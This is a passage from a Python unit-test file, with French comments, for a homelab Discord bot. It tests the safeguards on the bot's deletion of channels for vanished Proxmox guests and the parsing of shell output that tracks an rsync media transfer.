        """Garde-fou 1 : `guests` vide = trou de données, pas « tout a disparu »."""
        mort = self.FauxSalon("🔴-fronote-test-130", 1)
        cog = self._cog()
        await self._cycles(cog, self.FauxCategorie([mort]), {}, 10)
        self.assertFalse(mort.supprime, "PVE muet a suffi à supprimer un salon")

    async def test_suppression_apres_hysteresis(self):
        vivant = self.FauxSalon("🟢-jellyfin", 1)
        mort = self.FauxSalon("🟢-fronote-test-130", 2)
        cog = self._cog()
        cat = self.FauxCategorie([vivant, mort])
        guests = {"jellyfin": (105, None)}
        await self._cycles(cog, cat, guests, Provision_cycles() - 1)
        self.assertFalse(mort.supprime, "supprimé AVANT la fin de l'hystérésis")
        await self._cycles(cog, cat, guests, 1)
        self.assertTrue(mort.supprime, "jamais supprimé malgré l'hystérésis atteinte")
        self.assertFalse(vivant.supprime, "salon d'un invité VIVANT supprimé")

    async def test_retour_de_linvite_remet_le_compteur_a_zero(self):
        ch = self.FauxSalon("🔴-win11", 1)
        cog = self._cog()
        cat = self.FauxCategorie([ch])
        await self._cycles(cog, cat, {"jellyfin": (105, None)}, Provision_cycles() - 1)
        await self._cycles(cog, cat, {"jellyfin": (105, None), "win11": (111, None)}, 1)
        await self._cycles(cog, cat, {"jellyfin": (105, None)}, 1)
        self.assertFalse(ch.supprime, "compteur non remis à zéro au retour de l'invité")

    async def test_serveur_injoignable_epargne_sa_categorie(self):
        """Garde-fou 2 : aucun invité vu pour AVY-NAS -> on n'y touche pas."""
        ch = self.FauxSalon("🟢-immich-avy", 1)
        cog = self._cog()
        avy = {"AVY-NAS": self.FauxCategorie([ch])}
        await self._cycles(cog, None, {"jellyfin": (105, None)}, 10, avy=avy)
        self.assertFalse(ch.supprime, "catégorie d'un serveur muet vidée")

    async def test_salon_fait_main_jamais_supprime(self):
        """Garde-fou 3 : ni emoji de statut ni entrée dans prov['ct'] = pas un invité."""
        ch = self.FauxSalon("notes-perso", 1)
        cog = self._cog()
        await self._cycles(cog, self.FauxCategorie([ch]), {"jellyfin": (105, None)}, 10)
        self.assertFalse(ch.supprime, "salon créé à la main supprimé")

    async def test_salon_suivi_sans_emoji_est_candidat(self):
        ch = self.FauxSalon("vieux-ct", 7)
        cog = self._cog()
        cog.prov["ct"]["vieux-ct"] = 7
        await self._cycles(cog, self.FauxCategorie([ch]), {"jellyfin": (105, None)},
                           Provision_cycles())
        self.assertTrue(ch.supprime, "salon suivi mais sans invité PVE : non supprimé")
        self.assertNotIn("vieux-ct", cog.prov["ct"], "mapping non nettoyé")


def Provision_cycles():
    from bot.cogs.provision import Provision
    return Provision.GHOST_DELETE_CYCLES


# ------------------------------------------------ suivi du transfert média
class TestSondeTransfert(unittest.TestCase):
    """`transfert.parse_sonde` lit une sortie shell : elle doit rester bonne face aux
    deux pièges rencontrés en vrai — un `Type=oneshot` qui dure reste « activating »
    (le tester avec « active » annonçait « terminé » pendant que rsync tournait), et le
    pourcentage entier de rsync reste à 0 % pendant des jours sur 2 Tio."""

    SORTIE = ("etat=activating\n"
              "resultat=success\n"
              "debut=Tue 2026-08-18 00:01:12 CEST\n"
              "progres=         14.12G   0%    4.88MB/s  130:18:11  \n"
              "ligne=2026-08-18 00:02:12 rsync /mnt/media/ -> /mnt/avy-media/\n"
              "libre=5483426480128\n")

    def setUp(self):
        from bot.cogs import transfert
        self.t = transfert
        self.etat = transfert.parse_sonde(self.SORTIE)

    def test_etat_activating_est_actif(self):
        self.assertIn(self.etat["etat"], self.t.ETATS_ACTIFS)

    def test_octets_et_eta(self):
        self.assertAlmostEqual(self.etat["octets"] / 2**30, 14.12, places=2)
        self.assertEqual(self.etat["eta"], 130 * 3600 + 18 * 60 + 11)
        self.assertEqual(self.etat["libre"], 5483426480128)

    def test_progression_fine_pas_le_zero_de_rsync(self):
        self.assertEqual(self.etat["pct"], 0, "le % brut de rsync est bien 0")
        self.assertGreater(self.etat["pct_fin"], 0.1,
                           "progression recalculée toujours coincée à 0")
        self.assertLess(self.etat["pct_fin"], 5)

    def test_sortie_vide_ne_leve_pas(self):
        vide = self.t.parse_sonde("")
        self.assertEqual(vide["etat"], "inconnu")
        self.assertIsNone(vide["octets"])
        self.assertNotIn(vide["etat"], self.t.ETATS_ACTIFS,
                         "hôte muet interprété comme « transfert en cours »")

    def test_journal_tronque_sans_progression(self):
        """Journal sans ligne de progression : on garde l'état, pas de plantage."""
        e = self.t.parse_sonde("etat=failed\nresultat=exit-code\n")
        self.assertEqual(e["etat"], "failed")
        self.assertIsNone(e["pct_fin"])

    def test_barre_bornee(self):
        self.assertEqual(len(self.t.barre(0)), 20)
        self.assertEqual(len(self.t.barre(100)), 20)
        self.assertEqual(len(self.t.barre(None)), 20)
        self.assertEqual(len(self.t.barre(9999)), 20)


if __name__ == "__main__":
    unittest.main(verbosity=2)
